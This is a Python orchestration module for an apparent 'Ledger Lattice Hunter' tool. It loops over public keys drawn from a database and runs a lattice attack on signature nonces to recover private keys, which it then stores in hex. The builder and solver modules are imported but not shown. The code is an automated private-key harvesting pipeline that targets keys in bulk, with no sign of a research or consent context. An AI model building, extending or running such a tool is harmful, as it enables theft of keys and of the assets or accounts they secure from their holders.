"""
Main Attack Orchestration Module for the Ledger Lattice Hunter.

This module selects candidate public keys from the database and runs the
full lattice attack pipeline against them.
"""

import asyncio
import logging
from typing import Dict, Any

from ..utils.config import load_config
from ..utils.logging import setup_logging
from ..database.connection import DatabaseConnection
from ..lattice.builder import LatticeBuilder
from ..lattice.predicate import Predicate
from ..lattice.solver import LatticeSolver

logger = logging.getLogger(__name__)

class AttackManager:
    """
    Manages the overall lattice attack process.
    """

    def __init__(self, config: Dict[str, Any]):
        """Initializes the AttackManager."""
        self.config = config
        self.db = DatabaseConnection(self.config)
        self.builder = LatticeBuilder(self.db, self.config)
        self.predicate = Predicate(self.db, self.config, self.builder)
        self.solver = LatticeSolver(self.builder, self.predicate, self.config)

    async def run(self):
        """
        Starts the attack process.
        """
        await self.db.connect()
        logger.info("Starting attack manager...")

        try:
            # Main loop to select and attack public keys
            while True:
                target_pubkey = await self._select_next_target()
                if not target_pubkey:
                    logger.info("No more targets to attack. Waiting...")
                    await asyncio.sleep(self.config["attack"]["poll_interval"])
                    continue

                logger.info(f"Attacking public key: {target_pubkey}")
                await self._launch_attack(target_pubkey)

        finally:
            await self.db.close()
            logger.info("Attack manager stopped.")

    async def _select_next_target(self) -> str:
        """
        Selects the next public key to attack from the database.
        
        It first checks for high-priority targets identified by the analysis module.
        If none are found, it falls back to the default method.
        """
        # First, try to get a high-priority target
        priority_target = await self.db.get_high_priority_target()
        if priority_target:
            logger.info(f"Selected high-priority target: {priority_target}")
            return priority_target

        # Fallback to the original selection method
        min_sigs = self.config["lattice"]["min_signatures_for_attack"]
        target = await self.db.get_next_attack_candidate(min_sigs)
        return target.pubkey if target else None

    async def _launch_attack(self, pubkey: str):
        """
        Launches the lattice attack for a specific public key.
        """
        params = self.config["lattice"]
        
        # Setup the predicate with fresh signatures for this target
        await self.predicate.setup(pubkey)

        # Build the lattice
        lattice = await self.builder.build(
            pubkey,
            params["dimension"],
            params["klen"],
            params["x_param"]
        )

        if not lattice:
            logger.warning(f"Failed to build lattice for {pubkey}. Skipping.")
            # Optionally mark this key so we don't try it again immediately
            return

        # Solve for the private key
        private_key = self.solver.solve(
            lattice,
            params["klen"],
            params["x_param"]
        )

        if private_key:
            logger.info(f"SUCCESS: Private key found for {pubkey}!")
            await self._report_vulnerability(pubkey, private_key)
        else:
            logger.info(f"Attack failed for {pubkey}. Marking as checked.")
            await self.db.mark_as_checked(pubkey)


    async def _report_vulnerability(self, pubkey: str, private_key: int):
        """
        Reports a found vulnerability to the database.
        """
        report = {
            "pubkey": pubkey,
            "private_key": hex(private_key),
            "vulnerability_type": "NonceReuse_LatticeAttack",
            "attack_parameters": self.config["lattice"]
        }
        await self.db.insert_vulnerability(report)
        await self.db.mark_as_vulnerable(pubkey, "NonceReuse_LatticeAttack")


async def main():
    """Main entry point for the attack orchestrator."""
    setup_logging()
    config = load_config("config/config.yaml")
    manager = AttackManager(config)
    await manager.run()

if __name__ == "__main__":
    asyncio.run(main()) 